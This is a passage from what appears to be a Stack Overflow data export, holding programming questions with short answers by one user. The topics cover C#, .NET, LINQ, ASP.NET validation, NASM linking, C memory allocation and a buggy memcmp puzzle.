<p>in Xcode settings Project Settings/Build/NASM BUILD OPTIONs/OTHER FLAGS AS -DUSE_X86_ASM<br>
Also I have defined this pre-processor in header file myfunc.h also<br>
I have declared nABS in myfunc.h as </p>

<pre><code>#define USE_x86_ASM 
int nABS(int a);
</code></pre>

<p>and included myfunc.h in myfunc.c<br>
Both myfunc.c and math.nasm are compiled sussessfuly and generate math.o and myfunc.o, but I get a linking error </p>

<pre><code>Undefined symbols:
  ""_nABS"", referenced from:
      _func1 in myFunc.o
</code></pre>

<p>can anyone tell me why am I getting link error?</p>

<hr>

<p>I did the modification suggested in addition I removed %ifdef condition the modified code is as follows</p>

<pre><code>.text
.align 2
.globl _nABS   
.private_extern _nABS  
</code></pre>

<p>_nABS:
        push ebx
        ......
        ......
        pop ebx<br>
        ret
still I am getting same linking error the the file is compiled but I get same linking error.
I checked that the .o generated is included app.LinkFileList. </p>
","33708","","<p>Some C compilers add a preceding underscore to C symbols. Just add the underscore to your label in the assembly file (and <code>globl</code> directive, of course).</p>
"
"<p>I am using VSTS 2008. I have two projects (both are written in C#) in one solution file. Project 1 depends on the output (DLL2) of project 2. So, in project 1, I am using ""References --> Add Reference --> Browse"", then find and select the DLL2 generated by project 2.</p>

<p>My question is, I am not sure whether using such method to add reference will result in some my local computer specific file path dependencies? In more details, suppose both of projects are located in folder d:\testprojectsolution (d:\testprojectsolution\project1 and d:\testprojectsolution\project2), I want to make sure that if I copy the whole solution folder d:\testprojectsolution (with the same structures of project1/project2) to other people under different location (e.g. c:\my documents\sampleprpjects\projects), they could build successfully (not dependent on any specific file path on my local machine, for example, no need to find files under d:\testprojectsolution\project2 or something).</p>

<p>If my approach to add reference dependencies could result in some specific file path dependencies, please let me know how to solve this issue. :-)</p>

<p>thanks in advance,
George</p>
","33708","","<p>Instead of adding the reference using Browse, add it using Projects tab. It'll automatically consider the project dependency (and thus build order) and other stuff.</p>
"
"<p>I want to make this select using linq:</p>

<pre><code>Select cd.name from Content c, ContentDetail cd
where c.id_contentTypeID = contentTypeId and
      c.id_contentID = contentID and
      cd.id_contentID = c.contentID;
</code></pre>

<p>I have done the following but I don't know how to end the query:</p>

<pre><code>var list =
    from c in guideContext.Content, 
        dc in guideContext.ContentDetail
    where c.id_content == contentID &amp;&amp;

    select dc;
</code></pre>

<p>Any suggestion?</p>

<p>Thank you!</p>
","33708","","<p>This should do the job:</p>

<pre><code>var list = from cd in guideContext.ContentDetail
           where cd.id_contentID == contentID &amp;&amp; 
                 cd.Content.id_contentTypeID == contentTypeId
           select cd;
</code></pre>
"
"<p>Everyone knows and love String.IsNullOrEmpty(yourString) method.</p>

<p>I was wondering if it's going to confuse developers or make code better if we extend String class to have method like this:</p>

<pre><code>yourString.IsNullOrEmpty();
</code></pre>

<p><strong>Pro:</strong> </p>

<ol>
<li>More readable.</li>
<li>Less typing.</li>
</ol>

<p><strong>Cons:</strong></p>

<ol>
<li>Can be confusing because <code>yourString</code>
variable can be <code>null</code> and it looks
like you're executing method on a
<code>null</code> variable.</li>
</ol>

<p>What do you think?</p>

<p>The same question we can ask about <code>myObject.IsNull()</code> method.</p>

<p>That how I would write it:</p>

<pre><code>public static class StringExt
{
  public static bool IsNullOrEmpty(this string text)
  {
    return string.IsNullOrEmpty(text);
  }

  public static bool IsNull(this object obj)
  {
    return obj == null;
  }
}
</code></pre>
","33708","","<p>I think the root of this problem is what Jon Skeet has mentioned in the list of things he <a href=""http://stackoverflow.com/questions/282329/what-are-five-things-you-hate-about-your-favorite-language/282342#282342"">hates in his favorite language</a> (C#): C# should not have imported all extension methods in a whole <em>namespace</em> automatically. This process should have been done more explicitly.</p>

<p>My personal opinion about this specific question is (since we can't do anything about the above fact) to use the extension method if you want. I don't say it won't be confusing, but this fact about extension methods (that can be called on <code>null</code> references) is a global thing and doesn't affect only <code>String.IsNullOrEmpty</code>, so C# devs should get familiar with it.</p>

<p>By the way, it's fortunate that Visual Studio clearly identifies extension methods by <code>(extension)</code> in the IntelliSense tooltip.</p>
"
"<p>Is it possible to make svn run some command before every commit? I have some documentation in LaTeX in the repository and would like to have always the latest version of the compiled docs available as a pdf in the repository. The same would go with doxygen docs.</p>

<p>I'd bet that there is some magic svn:something property or something like that, but haven't found anything yet. Thanks.</p>

<p>Edit:
Thanks for the answers, but as far as I understand it hooks run on the server. In this case I don't have access to the server (the project is hosted on Assembla). Is there any way to do these things on a client?</p>
","33708","","<p>You can easily do the reverse. Create a shell script that runs <code>svn commit</code> after building stuff.</p>
"
"<p>Say my database tables have columns like <code>UserType</code>, <code>SalesType</code>, etc.</p>

<p>Should I have database tables with <code>UserTypeID</code>, <code>userTypeName</code> or should I just create a C# enumeration?</p>
","33708","","<p>What's wrong with both? If value's are user-defined or changing, definitely <code>enum</code> will not be suitable.</p>

<p>If values are strictly non-changing (such as gender), you can have them as <code>enums</code> for ease of reference in the application and also in the DB as separate table to enforce foreign keys and as a reference.</p>
"
"<p>Is it possible to iterate over a binary tree in O(1) auxiliary space (w/o using a stack, queue, etc.), or has this been proven impossible?  If it is possible, how can it be done?</p>

<p>Edit:  The responses I've gotten about this being possible if there are pointers to parent nodes are interesting and I didn't know that this could be done, but depending in how you look at it, that can be O(n) auxiliary space.  Furthermore, in my practical use case, there are no pointers to parent nodes.  From now on, please assume this when answering.</p>
","33708","","<p>I think there's no way you could do this, as you should somehow find the nodes where you left off in a path and to identify that you always need O(height) space.</p>
"
"<p>I am getting two contradicting views on this. Some source says there should be less little methods to reduce method calls, but some other source says writing shorter method is good for letting the JIT to do the optimization.</p>

<p>So, which side is correct?</p>
","33708","","<p>None, you should have relatively short method to achieve <em>readability</em>.</p>
"
"<p>I have the following regex set as the <code>ValidationExpression</code> property on a RegularExpressionValidator in a web form.  When I enter an illegal character in the validated control, the validator detects it and shows an error message.  </p>

<pre><code>&lt;appSettings&gt;
  &lt;add key=""categoryPattern"" value=""^[a-zA-Z0-9_+\-() ]{1,50}$"" /&gt;
&lt;/appSettings&gt;
</code></pre>

<p>My validator:</p>

<pre><code>&lt;asp:RegularExpressionValidator ValidationExpression=""&lt;%$ AppSettings:categoryPattern %&gt;""
</code></pre>

<p>My server side validation:</p>

<pre><code>Regex rex = new Regex(ConfigurationManager.AppSettings[""categoryPattern""]);
if (!rex.Match(categoryName).Success)
{
    throw new ArgumentException(""CategoryName must match expression: "" + rex);
</code></pre>

<p>As you can see, exactly the same pattern is applied client side and server side.</p>

<p>However, when I clear the validated control and submit an empty string, the validator thinks it's OK, and I get an error from my server side validation.  Anyone know what is wrong here, except for the broken contract of the RegularExpressionValidator?</p>
","33708","","<p>It is by design. You should also add a <code>RequiredFieldValidator</code> to force user entry. <code>RegularExpressionValidator</code> assumes empty fields as valid (and doesn't even run them through <code>Regex</code>). The reason behind this is that for instance, you might have an optional <code>Email address 2</code> field in the form that is not required, but if it's entered, it should be a valid email address. To achieve this easily, other validators ignore empty fields and if you need to make them required, you'd just add another <code>RequiredFieldValidator</code>.</p>

<p>In fact, it's not necessary to <strong>manually</strong> revalidate on server. ASP.NET validators also support server-side validation built it. You could just check <code>Page.IsValid</code> property. </p>
"
"<p>I usually add an <code>m_</code> in front of <code>private</code> fields and an <code>s_</code> before <code>static</code> members.</p>

<p>With a code like</p>

<pre><code>protected static readonly Random s_Random = new Random ();
</code></pre>

<p>I get the following warnings by VS2008's Code Analysis:</p>

<ul>
<li><code>CA1709</code>: Microsoft.Naming : Correct the casing of 's' in member name 'Bar.s_Random' by changing it to 'S'.</li>
<li><code>CA1707</code>: Microsoft.Naming : Remove the underscores from member name 'Bar.s_Random'.</li>
</ul>

<p>How to resolve this issue? Should I simply remove the <code>s_</code>? Or add a global suppression for this warning?</p>

<p><b>Edit:</b> My company lacks coding standards, so it's up to me to define them for my code. (Yea I know...)</p>

<p>If you think <code>s_</code> should be removed in general, I'd be glad if you could provide official sources.</p>
","33708","","<p>You are not following Microsoft's .NET naming convention that tells you not to prefix stuff with anything. If this is really what you want, add a suppression. Otherwise, follow the guideline by getting rid of <code>s_</code> and other similar prefixes.</p>

<p>From <a href=""http://msdn.microsoft.com/en-us/library/ms229012.aspx"" rel=""nofollow"">Names of Type Members</a>:<br />
""Names of Fields"" Section: ""Do not use a prefix for field names. For example, do not use g_ or s_ to distinguish static versus non-static fields.""</p>
"
"<p>I understand lambdas and the <code>Func</code> and <code>Action</code> delegates. But expressions stump me. In what circumstances would you use an <code>Expression&lt;Func&lt;T&gt;&gt;</code> rather than a plain old <code>Func&lt;T&gt;</code>?</p>
","33708","","<p>When you want to treat lambda expressions as expression trees and look inside them instead of executing them. For example, LINQ to SQL gets the expression and converts it to the equivalent SQL statement and submits it to server (rather than executing the lambda).</p>

<p>Conceptually, <code>Expression&lt;Func&lt;T&gt;&gt;</code> is <em>completely different</em> from <code>Func&lt;T&gt;</code>. <code>Func&lt;T&gt;</code> denotes a <code>delegate</code> which is pretty much a pointer to a method and <code>Expression&lt;Func&lt;T&gt;&gt;</code> denotes a <em>tree data structure</em> for a lambda expression. This tree structure <strong>describes what a lambda expression does</strong> rather than doing the actual thing. It basically holds data about the composition of expressions, variables, method calls, ... (for example it holds information such as this lambda is some constant + some parameter). You can use this description to convert it to an actual method (with <code>Expression.Compile</code>) or do other stuff (like the LINQ to SQL example) with it. The act of treating lambdas as anonymous methods and expression trees is purely a compile time thing.</p>

<pre><code>Func&lt;int&gt; myFunc = () =&gt; 10; // similar to: int myAnonMethod() { return 10; }
</code></pre>

<p>will effectively compile to an IL method that gets nothing and returns 10.</p>

<pre><code>Expression&lt;Func&lt;int&gt;&gt; myExpression = () =&gt; 10;
</code></pre>

<p>will be converted to a data structure that describes an expression that gets no parameters and returns the value 10:</p>

<p><a href=""http://i.stack.imgur.com/gwU0E.jpg""><img src=""http://i.stack.imgur.com/gwU0E.jpg"" alt=""Expression vs Func""> <em>larger image</em></a></p>

<p>While they both look the same at compile time, what the compiler generates is <strong>totally different</strong>.</p>
"
"<p>I'm a student of computer science in Germany. My professor gave use the following question to think about:</p>

<p>'Given a reference to a node in a single linked list (which is not the last node). Give an algorithm to delete this element from the list which has O(1) complexity while maintaining the integrity'.</p>

<p>I thought about this, but I'm pretty sure, that there is no such algorithm. since it is a single linked list, you must loop through every node in the list until you reach the node which should be delete, because you have to modify the next-Pointer in the node before the deleted. Which would lead to O(n) complexity.</p>

<p>Am I missing anything?</p>
","33708","","<p>Not exactly considered deleting a node but you can copy the data of the next node to the current and delete the next node:</p>

<pre><code>// pseudocode:
this.data = next.data;
var temp = this.next;
this.next = next.next;
delete temp;
</code></pre>
"
"<p>I want to have a Singleton that will be auto instantiated on program start.</p>

<p>What I mean by ""auto instantiated"" is that the code in the Singleton should instantiate itself on program start without any calls or declarations by other code.</p>

<p>So I want something like the following to instantiate and write out ""MySingleton Instantiated"" on program start (without the main code doing anything)...</p>

<pre><code>static class MySingleton
{
    private static MySingleton self = new MySingleton();

    protected MySingleton()
    {
        System.Console.WriteLine(""MySingleton Instantiated"");
    }
}
</code></pre>

<p>except this doesn't work since C# will only initialize the static members of a class when needed, ie when they are accessed/etc.</p>

<p>So what do I do? can this be done?</p>

<p>I haven't done this personally with C++ (haven't been using C++ for a while) but I'm pretty sure it can be done in C++ but not sure about C#.</p>

<p>Any help is appreciated. Thanks.</p>

<p><hr /></p>

<p>What I'm actually wanting to do with this is...
There would be many of these singleton classes (and more can be added as time goes on), all of which would inherit from a common (abstract) parent class (aka. PClass).</p>

<p>The PClass would have a static member that is a collection of PClasses... and a constructor to add itself to the collection...</p>

<p>Then in theory all the singletons would automagically be added to the collection (since when they are instantiated the base PClass constructor is called and adds the new object to the collection)... then the collection can be used without knowing anything about what child (singleton) classes have been implemented, and new child (singleton) classes can be added any time without having to change any other code.</p>

<p>Unfortunately I can't get the children (singletons) to instantiate themselves... screwing up my little plan, resulting in this post.</p>

<p>Hope I explained that well enough.</p>

<p><hr /></p>

<p>PS. Yes I realize there are bad feelings around Singletons and their use... but they are useful sometimes, and even if Satan himself made Singletons I'd still like to know if my problem can be achieved in C#. Thanks kindly to you all.</p>
","33708","","<p>I doubt this is possible without doing anything from <code>Main</code>. Even adding a <code>static MySingleton() {}</code> to the class does not guarantee its instantiation if you don't use it.</p>
"
"<p>Thanks to the help with <a href=""http://stackoverflow.com/questions/795483/is-a-lambda-expression-from-this-possible"">this</a>.</p>

<p>Tried this, without luck.. </p>

<p>I know </p>

<pre><code>from f in list 
where f.bar == someVar
select f
</code></pre>

<p>can be written as</p>

<pre><code>list.Where( f =&gt; f.bar == someVar );
</code></pre>

<p>Can a similar expression be created from</p>

<pre><code>from f in foo
from b in f.bar
where b.something == someVar
select f;
</code></pre>

<p>?</p>

<p>Edit: 
Sorry, I forgot f.bar in the second example is a list of objects.</p>
","33708","","<p>Definitely. Query syntax is just a syntactic sugar. It'll be translated to underlying lambda syntax by the compiler, so every query expression has an equivalent lambda based representation.</p>

<p>This is probably what you need (this is not strictly equivalent to that but works when you just have one <code>bar</code> matching the query in each <code>foo</code>):</p>

<pre><code>var result = foo.Where(f =&gt; f.bar.Any(b =&gt; b.something == someVar));
</code></pre>

<p>The strictly equivalent version is:</p>

<pre><code>var result = foo.SelectMany(f =&gt; f.bar, (f, b) =&gt; new { F = f, B = b })
                .Where(x =&gt; x.b.something == someVar)
                .Select(x =&gt; x.f);
</code></pre>
"
"<p>I've only recently heard about JSON (Javascript Object Notation).
Can anybody explain why it is considered (by some websites/blogs/etc) to be important?
We already have XML, why is JSON better (apart from being 'native to Javascript')?</p>

<p>Edit: Hmm, the main answer theme seems to be 'it is smaller'. However, the fact that it allows data fetching across domains, seems important to me. Or is this in practice not (yet) much used?</p>
","33708","","<p>XML has several drawbacks:</p>

<ul>
<li>It's heavy!</li>
<li>It provides a hierarchical representation of content which is not exactly the same as (but pretty much similar to) Javascript object model.</li>
<li>Javascript is available everywhere. Without any external parsers, you can process JSONs directly with JS interpreter.</li>
</ul>

<p>Clearly it's not meant to replace XML completely. For JS based Web apps, its advantages can be useful.</p>
"
"<p>I am attempting to declare and use an interface like this:</p>

<pre><code>public interface IItem&lt;T&gt;
{
  string Name { get; set; }
  T Value { get; set; }
}
</code></pre>

<p>This works fine until I attempt to create a list of these items.  This fails to compile:</p>

<pre><code>public interface IThing
{
    string Name { get; }
    IList&lt;IItem&lt;T&gt;&gt; ThingItems { get; }
}
</code></pre>

<p>so I am not certain where the issue is.  The items value is not defined until runtime, and I need to have collections of the items.  I figure that this is a fairly standard pattern, but I can not see where I am falling down.</p>
","33708","","<p>Two problems:</p>

<ol>
<li>You can't declare fields in an <code>interface</code>. (rationale: a field is considered an implementation detail, which is the thing interfaces are designed to abstract away)</li>
<li>You can't have a generic field without specifying the type parameter (unless you have a type parameter on the declaring type too).</li>
</ol>
"
"<p>I would have made the title more specific but I don't know how to put it.  I'm trying to infer the type of a generic's generic.</p>

<pre><code>public class BaseAction&lt;T&gt;
{
   public virtual void Commit(T t1, T t2){ //do something };
}

public class SpecificAction : BaseAction&lt;int&gt;
{
   // I would have specific code in here dealing with ints
   // public override void virtual Commit(int t1, int t2)
}

public static class DoSomething
{
    // this obviously doesn't compile
    // I want this method to know what K is based off of T.
    // eg. T is SpecificAction of type BaseAction&lt;int&gt;
    // can I get int from T ?
    public static void Execute&lt;T&gt;(K oldObj, K newObj) where T : BaseAction&lt;K&gt;, new()
    {
        T action = new T();
        action.Commit(oldObj, newObj);
    }
}
</code></pre>

<p>I want to be able to write something like this, with helpful intellisense.  Is it possible?</p>

<pre><code>DoSomething.Execute&lt;SpecificAction&gt;(5,4);
</code></pre>
","33708","","<p>I think the best case you can achieve is something like this:</p>

<pre><code>public static class DoSomething
{
    public static void Execute&lt;T,K&gt;(K oldObj, K newObj) 
                                      where T : BaseAction&lt;K&gt;, new()
    {
        T action = new T();
        action.Commit(oldObj, newObj);
    }
}
</code></pre>

<p>and you'd have to specify:</p>

<pre><code>DoSomething.Execute&lt;SpecificAction, int&gt;(5,4);
</code></pre>

<p>I doubt there would be a compile-time method to infer the generic parameter of a base class.</p>

<p>I have another idea (which I don't suggest, but for the record):</p>

<pre><code>public static void Execute&lt;T, K&gt;(Func&lt;T&gt; constructor, K oldObj, K newObj) 
                            where T : BaseAction&lt;K&gt; // no `new()` necessary
{
    T action = constructor();
    action.Commit(oldObj, newObj);
}
</code></pre>

<p>which you could use with:</p>

<pre><code>DoSomething.Execute(() =&gt; new SpecificAction(), 4, 5);
</code></pre>
"
"<p>Our organization's software is compiled for the .NET 3.5 Framework. We have some customers who wish to plug into our libraries, but insist on using older versions of Visual Studio (that preceded .NET 3.5), such as VS 2003. Is there a way for those customers to plug into our application, despite the fact that they're using older versions of Visual Studio (and therefore, older versions of .NET)? Currently, when they try to reference our assemblies, they get an error (which they didn't care to specify, unfortunately).</p>

<p>Is this possible? Any experience with this?</p>
","33708","","<p>So far, you could only have a single CLR version loaded in a process. It's not possible to run CLR 1.0 and 2.0 in a single process. This is going to change in .NET 4.0 (you'll be able to load .NET 2.0 CLR and 4.0 side by side). You can reference the DLL as long as you load the whole thing in the newer version of the runtime (which might cause some compatibility problems for older apps). If they don't want to install the new .NET framework at all, it won't be possible to do it.</p>
"
"<p>What is the difference between ""new"" and ""malloc""  and ""calloc"" and others in family?</p>

<p>(When) Do I need anything other than ""new"" ?</p>

<p>Is one of them implemented using any other?</p>
","33708","","<p><code>new</code> and <code>delete</code> are C++ specific features. They didn't exist in C. <code>malloc</code> is the old school C way to do things. Most of the time, you won't need to use it in C++.</p>

<ul>
<li><code>malloc</code> allocates uninitialized memory. The allocated memory has to be released with <code>free</code>.</li>
<li><code>calloc</code> is like <code>malloc</code> but initializes the allocated memory with a constant (0). It needs to be freed with <code>free</code>.</li>
<li><code>new</code> initializes the allocated memory by calling the constructor (if it's an object). Memory allocated with <code>new</code> should be released with <code>delete</code> (which in turn calls the destructor). It does not need you to manually specify the size you need and cast it to the appropriate type. Thus, it's more modern and less prone to errors.</li>
</ul>
"
"<p>I'm under the impression that these two commands result in the same end, namely incrementing X by 1 but that the latter is probably more efficient.</p>

<p>If this is not correct, please explain the diff.</p>

<p>If it is correct, why should the latter be more efficient? Shouldn't they both compile to the same IL?</p>

<p>Thanks.</p>
","33708","","<h3>IMPORTANT:</h3>

<p>The answers specifying evaluation are certainly correct in terms of what a <code>+=</code> do, in general languages. But in VB.NET, I assume <code>X</code> specified in the OP is a variable or a property.</p>

<p><hr /></p>

<p>They'll probably compile to the same IL.</p>

<h3>UPDATE (to address the probably controversy):</h3>

<p>VB.NET is a specification of a programming language. Any compiler that conforms to what's defined in the spec can be a VB.NET implementation. If you edit the source code of the MS VB.NET compiler to generate crappy code for <code>X += 1</code> case, you'll still conform to VB.NET spec (because it didn't say anything about how it's going to work. It just says the effect will be exactly the same, which makes it logical to generate the same code, indeed).</p>

<p>While the compiler is very very likely (and I feel it really does) generate the same code for both, but it's pretty complex piece of software. Heck, you can't even guarantee that a compiler generates the exact same code when the same code is compiled twice! </p>

<p>What you can feel 100% secure to say (unless you know the source code of the compiler intimately) is that a good compiler should generate the <em>same code, performance-wise</em>, which might or might not be the <em>exact same code</em>.</p>
"
"<p>These lines cause a security exception in a godaddy account. Any suggestions how to rewrite to get this to work?</p>

<pre><code>File.Delete(PropsFileName); 	// Clean up

TextWriter tw = new StreamWriter(PropsFileName);    // Create &amp; open the file
tw.WriteLine(DateTime.Now); 	// Write the date for reference
tw.WriteLine(TokenLine);    	// Write the BinarySecurityToken
tw.WriteLine(ConvIdLine);   	// Write the ConversationId
tw.WriteLine(ipccLine); 	// Write the IPCC
tw.Close();
</code></pre>

<p>Thanks!</p>

<p>The information is being written to session.properties variable in the temp directory.</p>
","33708","","<p>You should give NTFS permissions to the user running your ASP.NET app. Your hosting control panel probably supports assigning NTFS permissions to the folder.</p>
"
"<p>I don't mean dynamic casting in the sense of casting a lower interface or base class to a more derived class, I mean taking an interface definition that I've created, and then dynamically casting to that interface a different object NOT derived from that interface but supporting all the calls.</p>

<p>For example,</p>

<pre><code>interface IMyInterface
{
   bool Visible
   {
      get;
   }
}

TextBox myTextBox = new TextBox();
IMyInterface i = (dynamic&lt;IMyInterface&gt;)myTextBox;
</code></pre>

<p>This could be achieved at compile time for known types, and runtime for instances declared with dynamic. The interface definition is known, as is the type (in this example) so the compiler can determine if the object supports the calls defined by the interface and perform some magic for us to have the cast.</p>

<p>My guess is that this is not supported in C#4 (I was unable to find a reference to it), but I'd like to know for sure. And if it isn't, I'd like to discuss if it should be included in a future variant of the language or not, and the reasons for and against. To me, it seems like a nice addition to enable greater polymorphism in code without having to create whole new types to wrap existing framework types.</p>

<p><strong>Update</strong><br/>
Lest someone accuse me of plagiarism, I was not aware of <a href=""http://msmvps.com/blogs/jon%5Fskeet/archive/2008/10/30/c-4-0-dynamic-lt-t-gt.aspx"">Jon Skeet having already proposed this</a>. However, nice to know we thought of exceedingly similar syntax, which suggests it might be intuitive at least. Meanwhile, ""have an original idea"" remains on my bucket list for another day.</p>
","33708","","<p>I think Jon Skeet has had such a proposal (<a href=""http://msmvps.com/blogs/jon_skeet/archive/2008/10/30/c-4-0-dynamic-lt-t-gt.aspx"" rel=""nofollow"">http://msmvps.com/blogs/jon_skeet/archive/2008/10/30/c-4-0-dynamic-lt-t-gt.aspx</a>), but so far, I haven't heard that C# 4.0 is going to have it.</p>
"
"<p>I have the code below :</p>

<pre><code>public class Anything
{
    public int Data { get; set;}
}

public class MyGenericBase&lt;T&gt;
{
    public void InstanceMethod(T data)
    {
        // do some job
    }

    public static void StaticMethod(T data)
    {
        // do some job
    }

    // others members...
}

public sealed class UsefulController : MyGenericBase&lt;Anything&gt;
{
    public void ProxyToStaticMethod()
    {
        StaticMethod(null);
    }

    // others non derived members...
}

public class Container
{
    public UsefulController B { get; set; }
}

public class Demo
{
    public static void Test()
    {
        var c = new Container();
        c.B.InstanceMethod(null);   // Works as expected.
        c.B.StaticMethod(null);     // Doesn't work. 
                                    // Static method call on object rather than type. 
                                    // How to get the static method on the base type ?
        c.B.ProxyToStaticMethod();  // Works as expected.
    }
}
</code></pre>

<p>The compiler is very angry... I understand the error message but I don't know how to solve this. I was trying to get a type rather than an object to make my static method call, but I don't find the way to do it correctly. Moreover this results in something not elegant at all.</p>

<p>Basically, the GenericBase is a class from a framework with a lot of static methods and some instance methods. The controller is typing this class and extending it.</p>

<p>The container is a group of logical related controllers.</p>

<p>Interesting thing : a Java version of this code compiles correctly, but with a warning. The execution is correct, too.</p>

<p>Does it exist a design pattern to solve this ?</p>

<p>Thanks for your inputs !</p>

<p><hr /></p>

<p>I found a way to get rid of this problem, thanks to your answers. It seems to work, but I can not tell if there are side effects right know.</p>

<pre><code>    public class GenericBase&lt;T&gt; : MyGenericBase&lt;T&gt;
{
	// Create instance calls here for every base static method.
}

public sealed class UsefulController : GenericBase&lt;Anything&gt;
{
	// others non derived members...
}
</code></pre>
","33708","","<p>You can't do this in C#. You can do it in VB.NET and Java, but honestly, it doesn't really make sense. It just gives you a false sense of polymorphism in a <code>static</code> method, which is not real by any means. Since it's not polymorphic, the whole method call is known at compile time (statically) and you could mention the call directly with the class name.</p>
"
"<p>I need a stack structure that also allows the for the deleting of elements. I can't find anything like this in the .Net framework. Which structure provides the best basis for me to implement this?</p>
","33708","","<pre><code>System.Collections.Generic.List&lt;T&gt;
</code></pre>

<p>or </p>

<pre><code>System.Collections.Generic.LinkedList&lt;T&gt;
</code></pre>

<p>depending on the circumstance.</p>
"
"<p>In an ASP.NET application, I'd like to dynamically render several controls with their properties coming in from an XML document. Here's the kicker: I want to be able to dynamically determine the type of control. So, in my XML document, I have something like this:</p>

<pre><code>    &lt;control&gt;
    &lt;id&gt;myControl1&lt;/id&gt;
    &lt;type&gt;CheckBox&lt;/type&gt;
    &lt;text&gt;Text For This Control&lt;/text&gt;
    &lt;/control&gt;
</code></pre>

<p>I can get everything to work fine, as far as properties go, so long as I manually instantiate the new control as a checkbox...but I can't seem to figure out how to make it a checkbox, versus a textbox or whatever based on the XML information...</p>
","33708","","<p>You could make a <code>Dictionary&lt;string, Type&gt;</code> of valid types or you could create instance by name with <code>Activator.CreateInstance</code>.</p>
"
"<p>I'm looking at adding logging to an application, and I'm considering using Kiwi syslogd and a freeware library (clSyslog) to send logging messages to the daemon.  I briefly looked at log4c, and found compiling it with VC++ would take me more time than I had.</p>

<p>What tools do you use and recommend for logging messages?</p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/aa385780(VS.85).aspx"" rel=""nofollow"">Windows Event Log</a></p>
"
"<p>This is a silly question, but you can use this code to check if something is a particular type...</p>

<pre><code>if (child is IContainer) { //....
</code></pre>

<p>Is there a more elegant way to check for the ""NOT"" instance?</p>

<pre><code>if (!(child is IContainer)) { //A little ugly... silly, yes I know...

//these don't work :)
if (child !is IContainer) {
if (child isnt IContainer) { 
if (child aint IContainer) { 
if (child isnotafreaking IContainer) {
</code></pre>

<p>Yes, yes... silly question....</p>

<p><strong>Because there is some question</strong> on what the code looks like, it's just a simple return at the start of a method.</p>

<pre><code>public void Update(DocumentPart part) {
    part.Update();
    if (!(DocumentPart is IContainer)) { return; }
    foreach(DocumentPart child in ((IContainer)part).Children) {
       //...etc...
</code></pre>
","33708","","<pre><code>if(!(child is IContainer))
</code></pre>

<p>is the only operator to go (there's no <code>IsNot</code> operator).</p>

<p>You can build an extension method that does it:</p>

<pre><code>public static bool IsA&lt;T&gt;(this object obj) {
    return obj is T;
}
</code></pre>

<p>and then use it to:</p>

<pre><code>if (!child.IsA&lt;IContainer&gt;())
</code></pre>

<p>And you could follow on your theme:</p>

<pre><code>public static bool IsNotAFreaking&lt;T&gt;(this object obj) {
    return !(obj is T);
}

if (child.IsNotAFreaking&lt;IContainer&gt;()) { // ...
</code></pre>

<p><hr /></p>

<h3>Update (considering the OP's code snippet):</h3>

<p>Since you're actually casting the value afterward, you could just use <code>as</code> instead:</p>

<pre><code>public void Update(DocumentPart part) {
    part.Update();
    IContainer containerPart = part as IContainer;
    if(containerPart == null) return;
    foreach(DocumentPart child in containerPart.Children) { // omit the cast.
       //...etc...
</code></pre>
"
"<p>I am new to testing and mocking. I'm trying to test a business logic class which performs calculations, calls into the DAL and updates the database, and manages transactions. I'm using mocks to do unit testing, but how does full integration testing fit into all of this. Do I basically have the exact same tests, but use the real DAL or do I do something completely different?</p>
","33708","","<p>Pretty much. The important thing to know is that unit testing (in TDD) is not much about testing as it's about design. You create unit test to incorporate design decisions of every single component of code in an automated validation system; so that each part of your system conforms to its design. This way, you can rely on each component is not relying on unspecified features of other components.</p>
"
"<p>I got great help in my first question n hopefully someone will tell me or refer me to an earlier question about this topic.</p>

<p><strong>I want to link different forms like I click on a button on first one and it opens the</strong> second one.Basically I'm going to make a Menu for cellphone functions like SMS,CALL etc. so I want that If I click on call a new form opens asking for Number to call etc.</p>
","33708","","<pre><code>var otherForm = new Form2();
otherForm.ShowDialog(); // To show a modal dialog, or...
otherForm.Show();  // To show it as a non-modal window
</code></pre>
"
"<p>I am currently writing a VB .NET application where I am trying to open 1 database, create a select statement and then post the results into another database file using Microsoft Access database 2003.</p>

<p>The code seems to stop executing at the statement <code>cmdJetDB.ExecuteNonQuery()</code></p>

<p>I am using the following code:</p>

<pre><code>Dim conn1 As OleDbConnection = New OleDbConnection(""Provider=Microsoft.Jet.OLEDB.4.0; Data source=C:\Sample.mdb"")

Dim conn2 As OleDbConnection = New OleDbConnection(""Provider=Microsoft.Jet.OLEDB.4.0; Data source=C:\db2.mdb"")
conn1.Open()
conn2.Open()
Dim mySelectQuery As String 
mySelectQuery = ""SELECT Sample.LANE_ADDR, Sample.LANE_DT, Sample.LANE_TM, Sample.LANE_SPEED FROM (Sample) WHERE ((Sample.LANE_ADDR) = '164.909' OR (Sample.LANE_ADDR) = '164.909' AND Sample.LANE_DT BETWEEN #4/4/2003# AND #4/5/2003#)""
Dim cmdJetDB As New OleDbCommand(mySelectQuery, conn1)
cmdJetDB.ExecuteNonQuery()

Dim cmdInsert As String
cmdInsert = ""Insert INTO Table1 (Sample.LANE_ADDR, Sample.LANE_TM,Sample.LANE_SPEED) VALUES ('164.909', '00:12:30' , '30' )""
Dim cmdJetDB2 As New OleDbCommand(cmdInsert, conn2)
cmdJetDB2.ExecuteNonQuery()

conn2.Close()
conn1.Close()
</code></pre>

<p>Question: What is it that I am not doing. I opened both connections, stated my two SQL statements, yet it is still not working. I really need to get this application working. Please Help.........</p>
","33708","","<p><code>ExecuteNonQuery</code> cannot be used to <code>SELECT</code> stuff from a database. You should use <code>ExecuteReader</code> and use the result in a loop to <strong>set the parameters</strong> of the <code>INSERT</code> statement and then run <code>ExecuteNonQuery</code> in that loop. From the code you've written, how you'd expect the values should be populated in the <code>INSERT</code> statement?</p>
"
"<p>memcmp C implementation - any logical errors with this one?</p>

<p>I was going looking for an implementation of memcmp(), I found this code snippet, but it is clearly marked that there is 1 logical error with the code snippet. Could you help me find the logical error.</p>

<p>Basically, I tested this code against the string.h library implementation of memcmp() with different inputs, but the expected output is always the same as the library version of the function.</p>

<p>Here is the code snippet:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int memcmp_test(const char *cs, const char *ct, size_t n)
{
  size_t i;   

  for (i = 0; i &lt; n; i++, cs++, ct++)
  {
    if (*cs &lt; *ct)
    {
      return -1;
    }
    else if (*cs &gt; *ct)
    {
      return 1;
    }
    else
    {
      return 0;
    }
  }
} 



int main()
{
    int ret_val = 20; //initialize with non-zero value 

    char *string1 = ""china"";
    char *string2 = ""korea"";

    ret_val = memcmp_test(string1,string2,5); 

    printf (""ret_val is = %d"",ret_val);

    getchar();
    return 0;
}
</code></pre>

